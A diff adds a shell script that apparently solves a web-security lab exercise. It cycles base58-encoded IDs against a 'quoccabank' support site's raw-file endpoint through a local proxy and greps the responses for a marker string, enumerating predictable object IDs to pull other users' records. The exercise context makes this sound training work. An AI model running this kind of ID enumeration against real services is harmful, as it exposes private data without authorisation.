@@ -1,0 +1,26 @@
+#!/bin/sh
+
+split_input() {
+	local body=$(echo $response| sed 's/{.*}//')	
+	local json=$(echo $response| sed 's/.*{/{/')
+	local response_code=$(echo $json| jq '.response_code')
+	echo "number = $i,code = $response_code"
+	#echo $body
+	#echo $json
+	if [ $response_code -eq "200" ]
+	then
+		echo $body | grep '6443'
+	fi
+
+}
+
+
+for i in $(seq 1 300)
+do
+	#file=$(echo -n "$i:1"| base58)
+	file=$(echo -n "1780:$i"| base58)
+	response=$(curl -s --proxy http://127.0.0.1:8080 -k -i "https://support.quoccabank.com/raw/$file" --write-out '%{json}')
+	split_input $response $i
+	sleep 0.2
+done
+
